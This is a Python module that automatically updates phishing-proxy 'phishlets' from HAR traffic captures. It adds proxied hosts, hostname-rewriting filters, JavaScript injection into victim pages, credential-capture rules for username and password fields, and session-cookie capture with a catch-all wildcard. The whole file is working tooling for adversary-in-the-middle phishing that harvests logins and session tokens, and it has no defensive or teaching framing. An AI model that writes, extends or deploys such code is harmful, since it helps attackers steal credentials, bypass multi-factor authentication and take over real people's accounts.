#!/usr/bin/env python3
"""
Phishlet Updater
Automatically fixes phishlets based on HAR comparison results
"""

import copy
from typing import Dict, List, Optional, TYPE_CHECKING
from dataclasses import dataclass, field

if TYPE_CHECKING:
    from .har_comparator import ComparisonResult


@dataclass
class UpdateResult:
    """Result of phishlet update operation"""
    updated_phishlet: Dict
    changes_made: List[str] = field(default_factory=list)
    warnings: List[str] = field(default_factory=list)


class PhishletUpdater:
    """
    Updates phishlet configurations based on comparison results
    """
    
    # Minimal multi-level TLD support to avoid mis-parsing hosts like foo.service.gov.uk
    _MULTI_SUFFIXES = {
        'co.uk', 'gov.uk', 'ac.uk',
        'com.au', 'net.au', 'org.au',
        'com.br', 'com.mx', 'com.tr', 'com.ru', 'com.cn',
        'co.in', 'co.id', 'co.nz', 'com.sg', 'com.my', 'com.ph', 'com.sa',
    }

    @classmethod
    def _split_host(cls, host: str) -> tuple[str, str]:
        """
        Split a host into (orig_sub, domain) with basic multi-level TLD awareness.
        Examples:
          foo.bar.example.com -> ('foo.bar', 'example.com')
          login.service.gov.uk -> ('login', 'service.gov.uk')
        """
        parts = [p for p in host.split('.') if p]
        if len(parts) < 2:
            return ('', host)

        suffix2 = '.'.join(parts[-2:])
        if len(parts) >= 3 and suffix2 in cls._MULTI_SUFFIXES:
            domain = '.'.join(parts[-3:])
            orig_sub = '.'.join(parts[:-3])
        else:
            domain = suffix2
            orig_sub = '.'.join(parts[:-2])

        return (orig_sub, domain)
    
    def __init__(self):
        pass
    
    def update_from_comparison(self, phishlet_data: Dict,
                              comparison_result: "ComparisonResult") -> UpdateResult:
        """
        Update phishlet based on comparison result
        
        Args:
            phishlet_data: Original phishlet dictionary
            comparison_result: ComparisonResult from HARComparator
        
        Returns:
            UpdateResult with updated phishlet and change log
        """
        # Create a deep copy to avoid modifying original
        updated = copy.deepcopy(phishlet_data)
        result = UpdateResult(updated_phishlet=updated)
        
        # Add missing proxy hosts
        if comparison_result.missing_hosts:
            self._add_missing_hosts(updated, comparison_result.missing_hosts, result)
        
        # Add missing cookies
        if comparison_result.missing_cookies:
            self._add_missing_cookies(updated, comparison_result.missing_cookies, result)
        
        # Update sub_filters if needed
        self._update_sub_filters(updated, comparison_result.missing_hosts, result)
        
        return result
    
    def update_from_har_analysis(self, phishlet_data: Dict,
                                 har_hosts: List[str],
                                 har_cookies: Dict[str, List[str]]) -> UpdateResult:
        """
        Update phishlet from HAR analysis data
        
        Args:
            phishlet_data: Original phishlet dictionary
            har_hosts: List of hosts from HAR
            har_cookies: Dictionary of {domain: [cookie_names]}
        
        Returns:
            UpdateResult with updated phishlet
        """
        updated = copy.deepcopy(phishlet_data)
        result = UpdateResult(updated_phishlet=updated)
        
        # Get existing hosts
        existing_hosts = set()
        for host in updated.get('proxy_hosts', []):
            domain = host.get('domain', '')
            orig_sub = host.get('orig_sub', '')
            full_host = f"{orig_sub}.{domain}" if orig_sub else domain
            existing_hosts.add(full_host)
        
        # Find missing hosts
        missing_hosts = [h for h in har_hosts if h not in existing_hosts]
        
        if missing_hosts:
            self._add_missing_hosts(updated, missing_hosts, result)
        
        # Add missing cookies
        if har_cookies:
            self._add_cookies_by_domain(updated, har_cookies, result)
        
        return result
    
    def _add_missing_hosts(self, phishlet_data: Dict, 
                          missing_hosts: List[str],
                          result: UpdateResult):
        """Add missing hosts to proxy_hosts"""
        if 'proxy_hosts' not in phishlet_data:
            phishlet_data['proxy_hosts'] = []
        
        for host in missing_hosts:
            orig_sub, domain = self._split_host(host)
            if not domain:
                continue

            # Create proxy host entry
            proxy_host = {
                'phish_sub': orig_sub or 'www',
                'orig_sub': orig_sub or 'www',
                'domain': domain,
                'session': True,
                'is_landing': False
            }
            
            phishlet_data['proxy_hosts'].append(proxy_host)
            result.changes_made.append(f"Added proxy host: {host}")
            
            # Also add sub_filters for this host
            self._add_sub_filter_for_host(phishlet_data, orig_sub, domain, result)
    
    def _add_missing_cookies(self, phishlet_data: Dict,
                            missing_cookies: List[str],
                            result: UpdateResult):
        """Add missing cookies to auth_tokens"""
        if 'auth_tokens' not in phishlet_data:
            phishlet_data['auth_tokens'] = []
        
        # Group cookies by domain (simplified - add to first auth_token entry)
        if phishlet_data['auth_tokens']:
            # Add to first domain
            first_token = phishlet_data['auth_tokens'][0]
            if 'keys' not in first_token:
                first_token['keys'] = []
            
            for cookie in missing_cookies:
                if cookie not in first_token['keys']:
                    first_token['keys'].append(cookie)
                    result.changes_made.append(f"Added cookie to auth_tokens: {cookie}")
        else:
            # Create new auth_token entry
            result.warnings.append(
                "No existing auth_tokens entries - cannot add cookies without domain information"
            )
    
    def _add_cookies_by_domain(self, phishlet_data: Dict,
                              cookies_by_domain: Dict[str, List[str]],
                              result: UpdateResult):
        """Add cookies organized by domain"""
        if 'auth_tokens' not in phishlet_data:
            phishlet_data['auth_tokens'] = []
        
        for domain, cookie_names in cookies_by_domain.items():
            # Find existing auth_token for this domain
            existing_token = None
            for token in phishlet_data['auth_tokens']:
                if token.get('domain') == domain:
                    existing_token = token
                    break
            
            if existing_token:
                # Add missing cookies
                if 'keys' not in existing_token:
                    existing_token['keys'] = []
                
                for cookie in cookie_names:
                    if cookie not in existing_token['keys']:
                        existing_token['keys'].append(cookie)
                        result.changes_made.append(f"Added cookie '{cookie}' to domain '{domain}'")
            else:
                # Create new auth_token entry
                new_token = {
                    'domain': domain,
                    'keys': cookie_names + ['.*,regexp']  # Always add wildcard
                }
                phishlet_data['auth_tokens'].append(new_token)
                result.changes_made.append(f"Added new auth_token for domain '{domain}' with {len(cookie_names)} cookies")
    
    def _update_sub_filters(self, phishlet_data: Dict,
                           missing_hosts: List[str],
                           result: UpdateResult):
        """Update sub_filters for missing hosts"""
        if not missing_hosts:
            return
        
        if 'sub_filters' not in phishlet_data:
            phishlet_data['sub_filters'] = []
        
        for host in missing_hosts:
            orig_sub, domain = self._split_host(host)
            if domain:
                self._add_sub_filter_for_host(phishlet_data, orig_sub, domain, result)
    
    def _add_sub_filter_for_host(self, phishlet_data: Dict,
                                 orig_sub: str, domain: str,
                                 result: UpdateResult):
        """Add sub_filters for a specific host"""
        if 'sub_filters' not in phishlet_data:
            phishlet_data['sub_filters'] = []
        
        trigger_domain = f"{orig_sub}.{domain}" if orig_sub else domain
        
        # Check if filter already exists
        existing_filters = [
            f for f in phishlet_data['sub_filters']
            if f.get('triggers_on') == trigger_domain
        ]
        
        if not existing_filters:
            # Add basic hostname filter
            phishlet_data['sub_filters'].append({
                'triggers_on': trigger_domain,
                'orig_sub': orig_sub,
                'domain': domain,
                'search': '{hostname}',
                'replace': '{hostname}',
                'mimes': ['text/html', 'application/json', 'application/javascript']
            })
            result.changes_made.append(f"Added sub_filter for: {trigger_domain}")
    
    def add_js_inject(self, phishlet_data: Dict,
                     trigger_domains: List[str],
                     script: str) -> UpdateResult:
        """
        Add JavaScript injection to phishlet
        
        Args:
            phishlet_data: Phishlet dictionary
            trigger_domains: Domains to trigger injection
            script: JavaScript code to inject
        
        Returns:
            UpdateResult with updated phishlet
        """
        updated = copy.deepcopy(phishlet_data)
        result = UpdateResult(updated_phishlet=updated)
        
        if 'js_inject' not in updated:
            updated['js_inject'] = []
        
        # Add injection entry
        updated['js_inject'].append({
            'trigger_domains': trigger_domains,
            'trigger_paths': ['*'],
            'script': script
        })
        
        result.changes_made.append(
            f"Added JavaScript injection for domains: {', '.join(trigger_domains)}"
        )
        
        return result
    
    def update_credentials(self, phishlet_data: Dict,
                          username_key: str, username_search: str,
                          password_key: str, password_search: str,
                          cred_type: str = 'post') -> UpdateResult:
        """
        Update credentials configuration
        
        Args:
            phishlet_data: Phishlet dictionary
            username_key: Username field key
            username_search: Username search pattern
            password_key: Password field key
            password_search: Password search pattern
            cred_type: Credential type ('post', 'json', 'get')
        
        Returns:
            UpdateResult with updated phishlet
        """
        updated = copy.deepcopy(phishlet_data)
        result = UpdateResult(updated_phishlet=updated)
        
        updated['credentials'] = {
            'username': {
                'key': username_key,
                'search': username_search,
                'type': cred_type
            },
            'password': {
                'key': password_key,
                'search': password_search,
                'type': cred_type
            }
        }
        
        result.changes_made.append("Updated credentials configuration")
        
        return result
